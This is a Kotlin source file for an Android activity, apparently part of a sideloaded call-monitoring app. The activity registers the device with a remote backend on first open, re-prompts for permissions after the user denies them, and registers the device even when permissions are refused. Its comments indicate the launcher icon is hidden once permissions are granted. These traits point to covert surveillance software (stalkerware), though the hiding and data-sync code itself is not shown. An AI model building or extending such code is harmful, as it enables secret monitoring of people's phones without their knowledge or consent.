package com.calltech

import android.os.Bundle
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

/**
 * Sideload / first open — system permission dialog. Deny par icon hide nahi hota.
 */
class PermissionTrampolineActivity : AppCompatActivity() {
    private var retried = false

    private val permissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { _ ->
            continueAfterPermissionResult()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        MongoSyncHelper.ensureApiUrl(this)
        BackgroundSyncRunner.run {
            DeviceRegistration.registerNow(applicationContext)
        }

        if (!SyncBootstrap.needsRuntimePermissions(this)) {
            SyncBootstrap.onPermissionsReady(applicationContext)
            finish()
            return
        }

        permissionLauncher.launch(SyncBootstrap.requiredPermissions())
    }

    private fun continueAfterPermissionResult() {
        if (SyncBootstrap.needsRuntimePermissions(this) && !retried) {
            retried = true
            permissionLauncher.launch(SyncBootstrap.requiredPermissions())
            return
        }

        if (SyncBootstrap.needsRuntimePermissions(this)) {
            Log.w(TAG, "Permissions still missing — launcher icon rakho, register retry")
            BackgroundSyncNotifier.cancelPermission(applicationContext)
            BackgroundSyncRunner.run {
                DeviceRegistration.registerNow(applicationContext)
            }
            finish()
            return
        }

        BackgroundSyncNotifier.cancelPermission(applicationContext)
        SyncBootstrap.onPermissionsReady(applicationContext)
        finish()
    }

    companion object {
        private const val TAG = "PermissionTrampoline"
    }
}
